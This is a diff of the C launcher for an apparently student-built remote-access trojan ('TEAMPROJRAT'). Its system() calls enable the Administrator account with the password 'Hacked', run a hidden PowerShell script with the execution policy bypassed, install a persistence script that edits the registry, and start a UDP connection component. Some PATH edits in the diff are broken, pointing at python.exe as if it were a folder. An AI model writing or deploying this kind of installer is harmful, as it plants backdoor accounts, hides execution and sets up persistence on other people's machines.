@@ -15,13 +15,12 @@ int main()
     system("start /WAIT powershell Start-Process cmd -Verb runas -ArgumentList '/c net user Administrator Hacked /active:yes'");
     system("start /WAIT powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file \"Initialize_v1.ps1\""); //powershell script that checks if python is installed
     Sleep(2000);
-    system("setx path \"%PATH%;C:\\Python38\\\"");
-    system("setx path \"%PATH%;C:\\Python38\\Scripts\\\""); //adds the right path for pips
+    system("setx path \"%PATH%;C:\\Python38\\python.exe\\\"");
+    system("setx path \"%PATH%;C:\\Python38\\python.exe\\Scripts\\\""); //adds the right path for pips
     Sleep(10000);
     system("start /WAIT powershell Start-Process cmd -Verb runas -ArgumentList '/c pip install openpyxl'"); //openpyxl is needed to run pos.py
     Sleep(2000);
-    system("python 'C:\\Users\\student\\Desktop\\TEAMPROJRAT-master\\persistence\\add_startup.py'"); //starts the registry editing py file after python is installed
-    system("cd \"C:\\Users\\student\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\\" && pos.pyw");
-    system("exit");
+    system("start /WAIT powershell Start-Process cmd -ArgumentList '/c python \"C:\\Users\\student\\Desktop\\TEAMPROJRAT-master\\persistence\\add_startup.py\"'"); //starts the registry editing py file after python is installed
+    system("cd \"C:\\Users\\student\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\\" && pos.pyw && exit");
     return 0;
 }
